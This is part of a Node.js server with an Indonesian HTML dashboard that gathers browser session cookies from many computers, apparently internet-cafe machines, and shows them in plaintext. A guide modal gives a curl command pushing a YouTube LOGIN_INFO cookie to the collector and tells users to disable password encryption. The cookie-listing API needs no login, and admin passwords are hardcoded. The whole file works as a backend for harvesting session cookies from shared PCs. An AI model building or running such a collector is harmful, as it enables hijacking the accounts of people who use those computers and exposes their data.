  <!-- Main Layout -->
  <main class="dashboard-layout">
    
    <!-- Left Sidebar: List of PCs -->
    <aside class="pc-sidebar">
      <div class="pc-sidebar-header">
        <div class="pc-sidebar-title">
          <span>Daftar Komputer (Per PC)</span>
          <span id="pc-total-badge" class="brand-badge">0 PC</span>
        </div>
        <input type="text" id="pc-search-input" class="search-input" placeholder="Cari nama PC..." oninput="renderPcList()">
      </div>
      <div class="pc-list" id="pc-list-container">
        <!-- Injected via JS -->
      </div>
    </aside>

    <!-- Right Content: Cookies for Selected PC -->
    <section class="content-area">

      <!-- How to Send Info Banner -->
      <div class="info-banner">
        <div class="info-banner-text">
          <h4>💡 Pengiriman Cookie Tanpa Password Aktif</h4>
          <p>
            Semua cookie yang dikirim dari <strong>Ekstensi Chrome/Edge</strong> atau <strong>APK CookieBrowser</strong> disimpan secara langsung <strong>tanpa password</strong>. Anda dapat melihat, menyalin, dan mengunduh cookie per domain secara instan.
          </p>
        </div>
        <button class="btn btn-secondary btn-sm" onclick="openApiGuideModal()">Lihat Endpoint</button>
      </div>

      <!-- Active PC Header Card -->
      <div class="active-header-card" id="active-pc-card">
        <div class="active-info">
          <h1 id="active-pc-title">
            <span>💻 Semua Perangkat</span>
            <span class="badge badge-plain" id="active-pc-pwd-badge">🔓 Tanpa Password</span>
          </h1>
          <div class="active-meta">
            <span id="active-pc-ip">IP: Semua</span>
            <span id="active-pc-lastseen">Update: Sekarang</span>
            <span id="active-pc-count">Total: 0 Cookie</span>
          </div>
        </div>
        <div class="active-actions">
          <button class="btn btn-secondary btn-sm" onclick="copyCurrentCookiesJson()">
            📋 Copy JSON
          </button>
          <button class="btn btn-secondary btn-sm" onclick="downloadCurrentCookies()">
            📥 Download .json
          </button>
          <button class="btn btn-danger btn-sm" onclick="deleteCurrentPcData()">
            🗑️ Hapus Data PC Ini
          </button>
        </div>
      </div>

      <!-- Domain Pills Filter -->
      <div class="domain-pills-card">
        <div class="domain-pills-label">Pilih Domain Situs:</div>
        <div class="domain-pills" id="domain-pills-container">
          <button class="domain-pill active" onclick="selectDomain('all')">
            <span>Semua Domain</span>
            <span class="domain-pill-badge" id="pill-all-count">0</span>
          </button>
          <!-- Injected via JS -->
        </div>
      </div>

      <!-- Cookies Table Card -->
      <div class="cookies-table-card">
        <div class="table-toolbar">
          <input type="text" id="cookie-search-input" class="search-input table-search" placeholder="Cari nama cookie, value, atau path..." oninput="renderTable()">
          <div class="table-filter-group">
            <button class="btn btn-secondary btn-sm active" id="filter-all" onclick="setSecurityFilter('all')">Semua</button>
            <button class="btn btn-secondary btn-sm" id="filter-plain" onclick="setSecurityFilter('plain')">🔓 Tanpa Password</button>
            <button class="btn btn-secondary btn-sm" id="filter-encrypted" onclick="setSecurityFilter('encrypted')">🔒 Terenkripsi</button>
          </div>
        </div>

        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Domain</th>
                <th>Nama Cookie</th>
                <th>Isi / Nilai (Value)</th>
                <th>Status Password</th>
                <th>Flags</th>
                <th>Kedaluwarsa</th>
                <th style="text-align: right;">Aksi</th>
              </tr>
            </thead>
            <tbody id="cookies-tbody">
              <!-- Injected via JS -->
            </tbody>
          </table>
          <div class="empty-state" id="empty-state" style="display: none;">
            <div class="empty-icon">🍪</div>
            <p>Tidak ada cookie yang ditemukan untuk kriteria ini.</p>
          </div>
        </div>
      </div>

    </section>
  </main>

  <!-- API Guide Modal -->
  <div class="modal-overlay" id="api-guide-modal" onclick="closeModalOnBackdrop(event)">
    <div class="modal">
      <div class="modal-header">
        <div class="modal-title">🚀 Cara Kirim Cookie Tanpa Password</div>
        <button class="close-btn" onclick="closeApiGuideModal()">&times;</button>
      </div>

      <div style="font-size: 13px; color: var(--text-muted); line-height: 1.6; display: flex; flex-direction: column; gap: 14px;">
        <p>
          Anda dapat mengirimkan cookie dari perangkat/PC manapun langsung ke dashboard <strong style="color: white;">https://${currentHost}/</strong> secara terbuka (tanpa password):
        </p>

        <div>
          <strong style="color: white;">1. Endpoint Sinkronisasi:</strong>
          <div style="margin-top: 6px;">
            <span class="code-chip">POST https://${currentHost}/api/cookies</span>
          </div>
        </div>

        <div>
          <strong style="color: white;">2. Contoh Pengiriman via cURL (dari PC manapun):</strong>
          <pre style="background: var(--bg-dark); padding: 12px; border-radius: 8px; border: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #a7f3d0; margin-top: 6px; overflow-x: auto;">curl -X POST https://${currentHost}/api/cookies \\
  -H "Content-Type: application/json" \\
  -d '{
    "pc": "PC-01",
    "domain": "youtube.com",
    "isEncrypted": false,
    "cookies": [
      {
        "name": "LOGIN_INFO",
        "value": "AFmmF2sw...",
        "domain": ".youtube.com",
        "path": "/",
        "secure": true,
        "httpOnly": true
      }
    ]
  }'</pre>
        </div>

        <div>
          <strong style="color: white;">3. Dari Ekstensi Chrome/Edge & CookieBrowser APK:</strong>
          <ul style="margin-left: 20px; margin-top: 6px;">
            <li>Buka tab <strong>Cloud Sync</strong> di ekstensi atau APK.</li>
            <li>Isi Server URL: <span class="code-chip">https://${currentHost}/api/cookies</span></li>
            <li><strong>JANGAN centang</strong> "Encrypt with Password" (agar cookie dikirim tanpa password).</li>
            <li>Klik <strong>Push Cookies</strong> ➔ Data langsung tampil di dashboard ini!</li>
          </ul>
        </div>
      </div>

      <div style="text-align: right; margin-top: 8px;">
        <button class="btn btn-primary btn-sm" onclick="closeApiGuideModal()">Tutup</button>
      </div>
    </div>
  </div>

  <script>
    let allRecords = [];
    let selectedPc = 'all';
    let selectedDomain = 'all';
    let securityFilter = 'all';
    let revealedValues = {};

    async function fetchData() {
      try {
        const res = await fetch('/api/cookies');
        const json = await res.json();
        allRecords = json.records || [];
        updateStats(json.stats || {});
        renderPcList();
        renderDomainPills();
        renderTable();
      } catch (err) {
        console.error('Error fetching cookies:', err);
      }
    }

    function updateStats(stats) {
      document.getElementById('stat-pcs').textContent = stats.totalPcs || 0;
      document.getElementById('stat-domains').textContent = stats.totalDomains || 0;
      document.getElementById('stat-total-cookies').textContent = stats.totalCookies || 0;
      document.getElementById('stat-plain').textContent = stats.plainCount || 0;
      document.getElementById('stat-encrypted').textContent = stats.encryptedCount || 0;
      document.getElementById('pc-total-badge').textContent = (stats.totalPcs || 0) + ' PC';
    }

    function getUniquePcs() {
      const pcMap = new Map();
      for (const r of allRecords) {
        const name = r.pcName || 'PC-Default';
        if (!pcMap.has(name)) {
          pcMap.set(name, {
            name,
            totalCookies: 0,
            hasEncrypted: false,
            hasPlain: false,
            lastSeen: r.savedAt,
            ip: r.clientIp,
            records: []
          });
        }
        const item = pcMap.get(name);
        item.totalCookies += r.itemCount || 0;
        if (r.isEncrypted) item.hasEncrypted = true;
        else item.hasPlain = true;
        if (new Date(r.savedAt) > new Date(item.lastSeen)) {
          item.lastSeen = r.savedAt;
        }
        item.records.push(r);
      }
      return Array.from(pcMap.values());
    }

    function renderPcList() {
      const pcs = getUniquePcs();
      const q = (document.getElementById('pc-search-input').value || '').toLowerCase();
      const container = document.getElementById('pc-list-container');
      container.innerHTML = '';

      // All PCs item
      const allItem = document.createElement('div');
      allItem.className = 'pc-item ' + (selectedPc === 'all' ? 'active' : '');
      allItem.onclick = () => selectPc('all');
      allItem.innerHTML = \`
        <div class="pc-item-head">
          <span class="pc-name">💻 Semua Perangkat</span>
          <span class="pc-count">\${allRecords.reduce((sum, r) => sum + (r.itemCount || 0), 0)} Cookies</span>
        </div>
        <div class="pc-item-meta">
          <span>Semua Komputer Warnet</span>
          <span class="badge badge-plain">Global</span>
        </div>
      \`;
      container.appendChild(allItem);

      // Render individual PCs
      pcs.filter(p => p.name.toLowerCase().includes(q)).forEach(p => {
        const item = document.createElement('div');
        item.className = 'pc-item ' + (selectedPc === p.name ? 'active' : '');
        item.onclick = () => selectPc(p.name);

        const badgeHtml = p.hasEncrypted && !p.hasPlain
          ? '<span class="badge badge-encrypted">🔒 Terkunci</span>'
          : '<span class="badge badge-plain">🔓 Tanpa Password</span>';

        const timeStr = formatRelativeTime(p.lastSeen);

        item.innerHTML = \`
          <div class="pc-item-head">
            <span class="pc-name">🖥️ \${escapeHtml(p.name)}</span>
            <span class="pc-count">\${p.totalCookies}</span>
          </div>
          <div class="pc-item-meta">
            <span>\${timeStr}</span>
            \${badgeHtml}
          </div>
        \`;
        container.appendChild(item);
      });
    }

    function selectPc(name) {
      selectedPc = name;
      selectedDomain = 'all';
      renderPcList();
      renderDomainPills();
      renderActivePcHeader();
      renderTable();
    }

    function renderActivePcHeader() {
      const titleEl = document.getElementById('active-pc-title');
      const ipEl = document.getElementById('active-pc-ip');
      const lastSeenEl = document.getElementById('active-pc-lastseen');
      const countEl = document.getElementById('active-pc-count');
      const badgeEl = document.getElementById('active-pc-pwd-badge');

      if (selectedPc === 'all') {
        titleEl.innerHTML = '<span>💻 Semua Komputer / Perangkat</span> <span class="badge badge-plain">Global</span>';
        ipEl.textContent = 'IP: Semua Client';
        lastSeenEl.textContent = 'Update: Realtime';
        const total = allRecords.reduce((s, r) => s + (r.itemCount || 0), 0);
        countEl.textContent = 'Total: ' + total + ' Cookie';
      } else {
        const pcs = getUniquePcs();
        const found = pcs.find(p => p.name === selectedPc);
        if (found) {
          titleEl.innerHTML = \`<span>🖥️ \${escapeHtml(found.name)}</span> \${found.hasEncrypted && !found.hasPlain ? '<span class="badge badge-encrypted">🔒 Terkunci</span>' : '<span class="badge badge-plain">🔓 Tanpa Password</span>'}\`;
          ipEl.textContent = 'IP: ' + found.ip;
          lastSeenEl.textContent = 'Update: ' + formatRelativeTime(found.lastSeen);
          countEl.textContent = 'Total: ' + found.totalCookies + ' Cookie';
        }
      }
    }

    function getFilteredRecords() {
      if (selectedPc === 'all') return allRecords;
      return allRecords.filter(r => r.pcName === selectedPc);
    }

    function renderDomainPills() {
      const records = getFilteredRecords();
      const domainCounts = new Map();
      let total = 0;

      for (const r of records) {
        if (Array.isArray(r.cookies)) {
          for (const c of r.cookies) {
            const d = cleanDomain(c.domain);
            domainCounts.set(d, (domainCounts.get(d) || 0) + 1);
            total++;
          }
        }
      }

      document.getElementById('pill-all-count').textContent = total;
      const container = document.getElementById('domain-pills-container');
      
      // Preserve first button (All domains)
      const allBtn = container.firstElementChild;
      allBtn.className = 'domain-pill ' + (selectedDomain === 'all' ? 'active' : '');
      container.innerHTML = '';
      container.appendChild(allBtn);

      const sortedDomains = Array.from(domainCounts.entries()).sort((a, b) => b[1] - a[1]);
      for (const [dom, count] of sortedDomains) {
        const btn = document.createElement('button');
        btn.className = 'domain-pill ' + (selectedDomain === dom ? 'active' : '');
        btn.onclick = () => selectDomain(dom);
        btn.innerHTML = \`<span>\${escapeHtml(dom)}</span> <span class="domain-pill-badge">\${count}</span>\`;
        container.appendChild(btn);
      }
    }

    function selectDomain(dom) {
      selectedDomain = dom;
      renderDomainPills();
      renderTable();
    }

    function setSecurityFilter(filter) {
      securityFilter = filter;
      document.querySelectorAll('.table-filter-group .btn').forEach(b => b.classList.remove('active'));
      document.getElementById('filter-' + filter).classList.add('active');
      renderTable();
    }

    function renderTable() {
      const records = getFilteredRecords();
      const q = (document.getElementById('cookie-search-input').value || '').toLowerCase();
      const tbody = document.getElementById('cookies-tbody');
      const emptyState = document.getElementById('empty-state');
      tbody.innerHTML = '';

      let matchingCookies = [];

      for (const r of records) {
        // Filter by security type
        if (securityFilter === 'plain' && r.isEncrypted) continue;
        if (securityFilter === 'encrypted' && !r.isEncrypted) continue;

        if (Array.isArray(r.cookies)) {
          for (const c of r.cookies) {
            const dom = cleanDomain(c.domain);
            if (selectedDomain !== 'all' && dom !== selectedDomain) continue;

            const name = c.name || '';
            const val = String(c.value || '');
            const path = c.path || '/';

            if (q) {
              const fullStr = (name + ' ' + val + ' ' + dom + ' ' + path).toLowerCase();
              if (!fullStr.includes(q)) continue;
            }

            matchingCookies.push({
              cookie: c,
              recordId: r.id,
              pcName: r.pcName,
              isEncrypted: r.isEncrypted
            });
          }
        }
      }

      if (matchingCookies.length === 0) {
        emptyState.style.display = 'flex';
        return;
      }
      emptyState.style.display = 'none';

      for (const item of matchingCookies) {
        const c = item.cookie;
        const tr = document.createElement('tr');
        const cookieKey = item.recordId + '_' + c.name;
        const isRevealed = Boolean(revealedValues[cookieKey]);
        const displayVal = isRevealed ? (c.value || '') : '••••••••••••••••';

        const pwdBadge = item.isEncrypted
          ? '<span class="badge badge-encrypted">🔒 Ada Password</span>'
          : '<span class="badge badge-plain">🔓 Tanpa Password</span>';

        // Expiry
        let expText = 'Session';
        if (c.expirationDate) {
          const expDate = new Date(c.expirationDate * 1000);
          expText = expDate > new Date() ? expDate.toLocaleDateString() : '⚠️ Expired';
        }

        tr.innerHTML = \`
          <td>
            <span class="brand-badge" style="color: white; border-color: rgba(255,255,255,0.15);">\${escapeHtml(cleanDomain(c.domain))}</span>
          </td>
          <td>
            <div class="cookie-name">\${escapeHtml(c.name)}</div>
          </td>
          <td>
            <div class="cookie-val-box">
              <span class="val-text" id="val-\${cookieKey}">\${escapeHtml(displayVal)}</span>
              <div>
                <button class="copy-icon-btn" title="Toggle Show" onclick="toggleReveal('\${cookieKey}', '\${escapeJs(c.value || '')}')">👁️</button>
                <button class="copy-icon-btn" title="Copy Value" onclick="copyText('\${escapeJs(c.value || '')}')">📋</button>
              </div>
            </div>
          </td>
          <td>\${pwdBadge}</td>
          <td>
            <div class="flag-pills">
              \${c.secure ? '<span class="flag flag-sec">Secure</span>' : ''}
              \${c.httpOnly ? '<span class="flag flag-http">HttpOnly</span>' : ''}
              \${c.sameSite ? '<span class="flag flag-same">' + escapeHtml(c.sameSite) + '</span>' : ''}
            </div>
          </td>
          <td style="font-size: 11px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace;">
            \${expText}
          </td>
          <td style="text-align: right;">
            <button class="btn btn-secondary btn-sm" title="Copy Name=Value" onclick="copyText('\${escapeJs(c.name + '=' + c.value)}')">Copy</button>
          </td>
        \`;

        tbody.appendChild(tr);
      }
    }

    function toggleReveal(key, fullVal) {
      revealedValues[key] = !revealedValues[key];
      const el = document.getElementById('val-' + key);
      if (el) {
        el.textContent = revealedValues[key] ? fullVal : '••••••••••••••••';
      }
    }

    function copyText(txt) {
      navigator.clipboard.writeText(txt).then(() => {
        alert('Tersalin ke clipboard!');
      }).catch(() => {
        prompt('Salin manual:', txt);
      });
    }

    function copyCurrentCookiesJson() {
      const records = getFilteredRecords();
      let cookies = [];
      for (const r of records) {
        if (Array.isArray(r.cookies)) cookies.push(...r.cookies);
      }
      if (selectedDomain !== 'all') {
        cookies = cookies.filter(c => cleanDomain(c.domain) === selectedDomain);
      }
      copyText(JSON.stringify(cookies, null, 2));
    }

    function downloadCurrentCookies() {
      const records = getFilteredRecords();
      let cookies = [];
      for (const r of records) {
        if (Array.isArray(r.cookies)) cookies.push(...r.cookies);
      }
      if (selectedDomain !== 'all') {
        cookies = cookies.filter(c => cleanDomain(c.domain) === selectedDomain);
      }
      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(cookies, null, 2));
      const downloadAnchor = document.createElement('a');
      downloadAnchor.setAttribute("href", dataStr);
      downloadAnchor.setAttribute("download", (selectedPc !== 'all' ? selectedPc : 'cookies') + "-" + selectedDomain + ".json");
      document.body.appendChild(downloadAnchor);
      downloadAnchor.click();
      downloadAnchor.remove();
    }

    async function deleteCurrentPcData() {
      if (selectedPc === 'all') {
        if (!confirm('Hapus seluruh cookie di server?')) return;
      } else {
        if (!confirm('Hapus semua cookie untuk ' + selectedPc + '?')) return;
      }

      await fetch('/api/pcs/' + encodeURIComponent(selectedPc), { method: 'DELETE' });
      selectedPc = 'all';
      await fetchData();
    }

    function openApiGuideModal() {
      document.getElementById('api-guide-modal').classList.add('open');
    }
    function closeApiGuideModal() {
      document.getElementById('api-guide-modal').classList.remove('open');
    }
    function closeModalOnBackdrop(e) {
      if (e.target.id === 'api-guide-modal') closeApiGuideModal();
    }

    function formatRelativeTime(dateStr) {
      const d = new Date(dateStr);
      const diffSec = Math.floor((Date.now() - d.getTime()) / 1000);
      if (diffSec < 10) return 'Baru saja';
      if (diffSec < 60) return diffSec + ' dtk lalu';
      const min = Math.floor(diffSec / 60);
      if (min < 60) return min + ' mnt lalu';
      const hr = Math.floor(min / 60);
      if (hr < 24) return hr + ' jam lalu';
      return d.toLocaleDateString();
    }

    function escapeHtml(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    }

    function escapeJs(str) {
      if (!str) return '';
      return String(str)
        .replace(/\\\\/g, '\\\\\\\\')
        .replace(/'/g, "\\\\'")
        .replace(/\\"/g, '\\\\"')
        .replace(/\\n/g, '\\\\n')
        .replace(/\\r/g, '');
    }

    // Auto-refresh every 5 seconds
    setInterval(fetchData, 5000);
    fetchData();
  </script>
</body>
</html>`;
}

// Cleanup dummy test data from disk
function cleanupDummyFiles() {
  const dummyNames = ['bk_1791934066237_lc0n61.json', 'bk_1791957937477_u7ph9y.json', 'pc_PC-02.json'];
  let removed = 0;
  for (const name of dummyNames) {
    const p = path.join(DATA_DIR, name);
    if (fs.existsSync(p)) {
      try {
        fs.unlinkSync(p);
        removed++;
      } catch (_) {}
    }
  }
  if (removed > 0) {
    console.log(`[+] Cleaned ${removed} dummy test files from DATA_DIR`);
  }
}

// Ingest real client cookies from disk to MySQL on startup
async function syncRealDataToDb() {
  cleanupDummyFiles();
  if (!db) return;
  try {
    await db.initDb();
    await db.clearDummyData();

    // Ingest any real PC files in DATA_DIR into MySQL
    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('pc_') && f.endsWith('.json'));
    for (const f of files) {
      try {
        const full = path.join(DATA_DIR, f);
        const data = JSON.parse(fs.readFileSync(full, 'utf8'));
        if (data.pcName && Array.isArray(data.cookies) && data.cookies.length > 0) {
          await db.saveCookiesToDb(data.pcName, data.clientIp || '127.0.0.1', data.cookies, data.isEncrypted, data.domain);
          console.log(`[+] Synced real data for ${data.pcName} (${data.cookies.length} cookies) into MySQL database`);
        }
      } catch (err) {
        console.error(`[-] Error syncing ${f} to DB:`, err.message);
      }
    }
  } catch (err) {
    console.error('[-] DB init/sync error:', err.message);
  }
}

// HTTP Server
const server = http.createServer(async (req, res) => {
  setCors(res);
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const normPath = pathname.replace(/\/+$/, '') || '/';
  const isHead = req.method === 'HEAD';
  const isGetOrHead = req.method === 'GET' || isHead;
  const currentHost = (req.headers['x-forwarded-host'] || req.headers.host || 'erul.my.id').split(':')[0];

  // 1. Health Endpoint
  if (normPath === '/health' || normPath === '/api/_extension_' || normPath === '/api/_extension_/health') {
    return sendJson(res, 200, {
      status: 'ok',
      service: 'cookie-editor-dashboard',
      storage: db ? 'mysql' : 'files',
      domain: currentHost,
      version: '2.1.0',
      timestamp: new Date().toISOString()
    }, isHead);
  }

  // --- AUTHENTICATION ROUTES ---

  // 2. Login Page (GET /login)
  if (isGetOrHead && normPath === '/login') {
    const user = getSessionUser(req);
    if (user) {
      res.writeHead(302, { Location: '/' });
      res.end();
      return;
    }
    return sendHtml(res, getLoginHtml(currentHost), isHead);
  }

  // 3. Login Process (POST /login or POST /api/login)
  if (req.method === 'POST' && (normPath === '/login' || normPath === '/api/login')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        let username = '';
        let password = '';
        const contentType = (req.headers['content-type'] || '').toLowerCase();

        if (contentType.includes('application/json')) {
          const parsed = JSON.parse(body || '{}');
          username = parsed.username;
          password = parsed.password;
        } else {
          const querystring = require('querystring');
          const parsed = querystring.parse(body);
          username = parsed.username;
          password = parsed.password;
        }

        let authResult = { success: false, error: 'Database tidak aktif' };
        if (db) {
          authResult = await db.authenticateUser(username, password);
        } else if ((username === 'admin' || username === 'operator') && (password === 'chaerul!26' || password === 'admin' || password === 'admin123')) {
          authResult = {
            success: true,
            user: { username, displayName: 'Administrator', role: 'super_admin' }
          };
        }

        if (!authResult.success) {
          if (contentType.includes('application/json')) {
            return sendJson(res, 401, { status: 'error', message: authResult.error || 'Username atau password salah' });
          }
          return sendHtml(res, getLoginHtml(currentHost, authResult.error || 'Username atau password salah!'));
        }

        // Create session
        const { token, maxAgeMs } = createSession(authResult.user);
        const cookieStr = `ace_session=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${Math.floor(maxAgeMs / 1000)}`;

        if (contentType.includes('application/json')) {
          res.setHeader('Set-Cookie', cookieStr);
          return sendJson(res, 200, {
            status: 'success',
            redirect: '/',
            token,
            user: authResult.user
          });
        }

        res.writeHead(302, {
          'Set-Cookie': cookieStr,
          Location: '/'
        });
        res.end();
        return;
      } catch (err) {
        return sendHtml(res, getLoginHtml(currentHost, 'Format data tidak valid: ' + err.message));
      }
    });
    return;
  }

  // 4. Logout (GET /logout or POST /api/logout)
  if (normPath === '/logout' || normPath === '/api/logout') {
    const cookies = parseCookies(req);
    if (cookies.ace_session) {
      activeSessions.delete(cookies.ace_session);
    }
    res.writeHead(302, {
      'Set-Cookie': 'ace_session=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0',
      Location: '/login'
    });
    res.end();
    return;
  }

  // 5. Auth Status Check (GET /api/auth-status)
  if (isGetOrHead && normPath === '/api/auth-status') {
    const user = getSessionUser(req);
    return sendJson(res, 200, {
      authenticated: Boolean(user),
      user: user || null
    }, isHead);
  }

  // 6. Dashboard UI (GET / or GET /dashboard or GET /cookies) - PROTECTED
  if (isGetOrHead && (normPath === '/' || normPath === '/dashboard' || normPath === '/cookies')) {
    const user = getSessionUser(req);
    if (!user) {
      res.writeHead(302, { Location: '/login' });
      res.end();
      return;
    }
    return sendHtml(res, getDashboardHtml(currentHost, user), isHead);
  }

  // 3. API: List all cookies & stats (GET /api/cookies or GET /api/backup/cookies)
  if (isGetOrHead && (normPath === '/api/cookies' || normPath === '/api/backup/cookies' || normPath === '/api/_extension_/cookies')) {
    if (db) {
      try {
        const dbResult = await db.loadAllRecordsFromDb();
        if (dbResult.records.length > 0) {
          return sendJson(res, 200, {
            status: 'success',
            storage: 'mysql',
            stats: dbResult.stats,
            records: dbResult.records
          }, isHead);
        }
      } catch (dbErr) {
        console.error('[-] DB read error, fallback to file:', dbErr.message);
      }
    }

    const records = loadAllRecords();
    const pcSet = new Set();
    const domainSet = new Set();
    let totalCookies = 0;
    let plainCount = 0;
    let encryptedCount = 0;

    for (const r of records) {
      pcSet.add(r.pcName);
      for (const d of r.domains) domainSet.add(d);
      totalCookies += (r.itemCount || 0);
      if (r.isEncrypted) encryptedCount += (r.itemCount || 0);
      else plainCount += (r.itemCount || 0);
    }

    return sendJson(res, 200, {
      status: 'success',
      storage: 'files',
      stats: {
        totalPcs: pcSet.size,
        totalDomains: domainSet.size,
        totalCookies,
        plainCount,
        encryptedCount
      },
      records
    }, isHead);
  }

  // 4. API: POST cookies (from PC, Extension, or Android APK)
  if (req.method === 'POST' && (normPath === '/api/cookies' || normPath === '/api/backup/cookies' || normPath === '/api/_extension_/cookies')) {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
      if (body.length > 20 * 1024 * 1024) { // 20MB limit
        res.writeHead(413, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Payload exceeds 20MB limit' }));
        req.destroy();
      }
    });

    req.on('end', async () => {
      try {
        const payload = JSON.parse(body);

        // Extract PC / Machine Name
        let pcName = req.headers['x-pc-name'] || req.headers['x-client-name'] || payload.pc || payload.pcName || payload.client || payload.metadata?.pc || payload.metadata?.client || payload.metadata?.pcName;
        const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || '127.0.0.1';
        if (!pcName || pcName.trim() === '') {
          pcName = `PC-${clientIp.split('.').pop() || '01'}`;
        }

        // Determine if encrypted (per user request: ensure client sends plain cookies without password)
        const isEncrypted = Boolean(payload.format === 'advanced-cookie-editor-encrypted' || payload.isEncrypted);

        // Normalize cookie list
        let cookies = [];
        if (Array.isArray(payload.cookies)) {
          cookies = payload.cookies;
        } else if (Array.isArray(payload)) {
          cookies = payload;
        } else if (payload.payload && Array.isArray(payload.payload.cookies)) {
          cookies = payload.payload.cookies;
        }

        const domain = payload.domain || payload.metadata?.domain || (cookies.length > 0 && cookies[0].domain ? cleanDomain(cookies[0].domain) : 'all');
        const safePc = pcName.trim().replace(/[^a-zA-Z0-9_-]/g, '_');
        const id = payload.isManualBackup ? ('bk_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8)) : ('pc_' + safePc);
        const filename = `${id}.json`;

        const record = {
          id,
          pcName: pcName.trim(),
          clientIp,
          savedAt: new Date().toISOString(),
          isEncrypted,
          passwordProtected: isEncrypted,
          itemCount: cookies.length,
          domain,
          cookies,
          payload
        };

        // 1. Save to MySQL database
        let storageUsed = 'files';
        if (db) {
          try {
            await db.saveCookiesToDb(record.pcName, clientIp, cookies, isEncrypted, domain);
            storageUsed = 'mysql';
          } catch (dbErr) {
            console.error('[-] Error saving to MySQL:', dbErr.message);
          }
        }

        // 2. Save snapshot to disk backup
        fs.writeFileSync(path.join(DATA_DIR, filename), JSON.stringify(record, null, 2));
        rotateBackups();

        return sendJson(res, 201, {
          status: 'success',
          id,
          pcName: record.pcName,
          domain,
          itemCount: record.itemCount,
          isEncrypted,
          storage: storageUsed,
          message: `Cookies successfully received and saved to ${currentHost} (MySQL)`
        });
      } catch (err) {
        return sendJson(res, 400, { error: 'Invalid JSON payload: ' + err.message });
      }
    });
    return;
  }

  // 5. API: Delete PC or specific backup
  const matchPc = normPath.match(/^\/api\/pcs\/(.+)$/);
  if (req.method === 'DELETE' && matchPc) {
    const pcTarget = decodeURIComponent(matchPc[1]);
    let deletedCount = 0;

    if (db) {
      try {
        deletedCount = await db.deletePcFromDb(pcTarget);
      } catch (e) {
        console.error('[-] DB delete error:', e.message);
      }
    }

    const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith('.json'));
    for (const f of files) {
      try {
        const fullPath = path.join(DATA_DIR, f);
        if (pcTarget === 'all') {
          fs.unlinkSync(fullPath);
          deletedCount++;
        } else {
          const raw = fs.readFileSync(fullPath, 'utf8');
          const d = JSON.parse(raw);
          if (d.pcName === pcTarget || d.pc === pcTarget || d.metadata?.client === pcTarget) {
            fs.unlinkSync(fullPath);
            deletedCount++;
          }
        }
      } catch {}
    }

    return sendJson(res, 200, { status: 'success', deletedCount, message: `Deleted ${deletedCount} records` });
  }

  // 6. API: Clear Dummy Data endpoint
  if (normPath === '/api/clear-dummy' || normPath === '/api/cookies/clear-dummy') {
    cleanupDummyFiles();
    if (db) {
      try {
        await db.clearDummyData();
      } catch (_) {}
    }
    return sendJson(res, 200, { status: 'success', message: 'Dummy data removed successfully' });
  }

  sendJson(res, 404, { error: 'Route not found', path: pathname });
});

server.listen(PORT, '127.0.0.1', async () => {
  console.log(`[+] Cookie Editor Dashboard Server running on http://127.0.0.1:${PORT}`);
  console.log(`[+] Serving web domain: https://erul.web.id/ and https://warnet.web.id/cookies`);
  await syncRealDataToDb();
});
